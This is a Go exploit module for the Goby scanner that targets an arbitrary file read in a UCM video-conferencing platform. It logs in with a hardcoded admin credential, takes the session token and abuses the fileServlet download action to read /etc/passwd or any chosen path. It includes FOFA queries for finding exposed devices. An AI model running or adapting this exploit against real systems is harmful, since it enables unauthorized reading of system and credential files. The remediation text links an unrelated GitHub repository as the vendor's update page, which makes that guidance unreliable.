package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "UCM cooperative communication platform fileServlet arbitrary file reading vulnerability",
    "Description": "<p>UCM cooperative communication platform is a SIP communication control hardware device, which can realize terminal registration of traditional video conference system, multi-party conference (MCU), equipment management, firewall traversal, etc.</p><p>The UCM collaborative communication platform of Beijing Zhongchuang Video Technology Co., Ltd. has an arbitrary file reading vulnerability, which can be used by attackers to read arbitrary files.</p>",
    "Product": "Beijing Zhongchuang Video Technology Co., Ltd. - UCM collaborative communication platform",
    "Homepage": "http://www.hexmeet.com/",
    "DisclosureDate": "2022-09-21",
    "Author": "conan24",
    "FofaQuery": "body=\"/libs/angular/angular-resource.js\" && body=\"/libs/ztree/jquery.ztree.exhide.js\"",
    "GobyQuery": "body=\"/libs/angular/angular-resource.js\" && body=\"/libs/ztree/jquery.ztree.exhide.js\"",
    "Level": "2",
    "Impact": "<p>The UCM collaborative communication platform of Beijing Zhongchuang Video Technology Co., Ltd. has an arbitrary file reading vulnerability, which can be used by attackers to read arbitrary files.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a> 2. Set access policies and whitelist access through security devices such as firewalls. 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://fofamini.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "readfile",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/api/rest/v2.0/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"account\":\"admin\",\"password\":\"8eFbr3c50deaEzq40Cmqvg==\",\"deviceType\":\"WEB\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "token",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|token\":\"(.*?)\",\"profile"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/fileServlet?action=downloadDbBackupFile&userToken={{{token}}}&fileName=/etc/passwd",
                "follow_redirect": false,
                "header": {
                    "Referer": "https://baidu.com/meeting/"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/api/rest/v2.0/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json;charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"account\":\"admin\",\"password\":\"8eFbr3c50deaEzq40Cmqvg==\",\"deviceType\":\"WEB\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "token",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|token\":\"(.*?)\",\"profile"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/fileServlet?action=downloadDbBackupFile&userToken={{{token}}}&fileName={{{readfile}}}",
                "follow_redirect": false,
                "header": {
                    "Referer": "https://baidu.com/meeting/"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "UCM协同通讯平台 fileServlet 任意文件读取漏洞",
            "Product": "北京中创视讯科技有限公司-UCM协同通讯平台",
            "Description": "<p>UCM协同通讯平台是一台SIP通信控制硬件设备，该设备可实现传统视频会议系统终端注册、多方会议（MCU）、设备管理、防火墙穿越等。</p><p>北京中创视讯科技有限公司UCM协同通讯平台存在任意文件读取漏洞，攻击者可利用该漏洞读取任意文件。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a> 2、通过防火墙等安全设备设置访问策略，设置白名单访问。 3、如非必要，禁止公网访问该系统。<br><br></p>",
            "Impact": "<p>北京中创视讯科技有限公司UCM协同通讯平台存在任意文件读取漏洞，攻击者可利用该漏洞读取任意文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "UCM cooperative communication platform fileServlet arbitrary file reading vulnerability",
            "Product": "Beijing Zhongchuang Video Technology Co., Ltd. - UCM collaborative communication platform",
            "Description": "<p>UCM cooperative communication platform is a SIP communication control hardware device, which can realize terminal registration of traditional video conference system, multi-party conference (MCU), equipment management, firewall traversal, etc.</p><p>The UCM collaborative communication platform of Beijing Zhongchuang Video Technology Co., Ltd. has an arbitrary file reading vulnerability, which can be used by attackers to read arbitrary files.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/sylabs/sif\">https://github.com/sylabs/sif</a> 2. Set access policies and whitelist access through security devices such as firewalls. 3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The UCM collaborative communication platform of Beijing Zhongchuang Video Technology Co., Ltd. has an arbitrary file reading vulnerability, which can be used by attackers to read arbitrary files.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}